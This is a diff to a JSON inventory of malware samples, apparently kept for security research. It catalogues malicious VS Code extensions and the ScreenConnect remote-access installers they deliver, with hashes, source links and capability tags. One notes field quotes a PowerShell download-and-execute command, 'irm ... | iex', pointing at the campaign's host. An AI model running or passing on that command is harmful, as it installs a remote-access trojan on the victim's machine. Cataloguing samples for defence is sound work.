@@ -17,7 +17,10 @@
       "discoveryDate": "2024-01-01",
       "capabilities": ["obfuscation", "powershell-execution", "downloader"],
       "localPath": "kagema/ShowSnowcrypto.SnowShoNo/showsnowcrypto.snowshono-0.6.0.zip",
-      "notes": "Obfuscated JS. Runs hidden PowerShell: irm https://niggboo.com/aaa | iex. Windows-only check."
+      "notes": "Obfuscated JS. Runs hidden PowerShell: irm https://niggboo.com/aaa | iex. Windows-only check.",
+      "relatedHashes": {
+        "ScreenConnect.ClientSetup.msi": "290027e4e32cf4983ccaa9811b3090c7397a3711d23e426ab144bec1167c456b"
+      }
     },
     {
       "id": "ecm3401-attack-suite",
@@ -369,10 +372,10 @@
       "campaign": "TheseVibesAreOff",
       "malwareFamily": "ScreenConnect",
       "sha256": "eade98db399cae0e6bdb2a4eb0de912d0d9c649f53b2e150522301e87b2c8a46",
-      "source": "marketplace",
+      "source": "research",
       "sourceUrl": "https://secureannex.com/blog/these-vibes-are-off/",
       "discoveryDate": "2025-11-01",
-      "capabilities": ["rat", "remote-access", "screenconnect"],
+      "capabilities": ["rat", "remote-access"],
       "localPath": "secureannex/solidityai.solidity-1.0.9.vsix",
       "notes": "ScreenConnect RAT delivery via fake Solidity extension. Part of SecureAnnex 'These Vibes Are Off' report."
     },
@@ -381,14 +384,14 @@
       "name": "ScreenConnect MSI Installer",
       "publisher": "ShowSnowcrypto",
       "version": null,
-      "platform": "vscode",
+      "platform": "windows",
       "campaign": "SnowShoNo",
       "malwareFamily": "ScreenConnect",
       "sha256": "290027e4e32cf4983ccaa9811b3090c7397a3711d23e426ab144bec1167c456b",
       "source": "malwarebazaar",
       "sourceUrl": "https://bazaar.abuse.ch/sample/290027e4e32cf4983ccaa9811b3090c7397a3711d23e426ab144bec1167c456b/",
       "discoveryDate": "2025-10-01",
-      "capabilities": ["rat", "remote-access", "screenconnect", "persistence"],
+      "capabilities": ["rat", "remote-access", "persistence"],
       "localPath": "secureannex/snowshono-msi/290027e4e32cf4983ccaa9811b3090c7397a3711d23e426ab144bec1167c456b.msi",
       "notes": "ScreenConnect MSI installer payload delivered by SnowShoNo PowerShell downloader. 13MB MSI."
     }
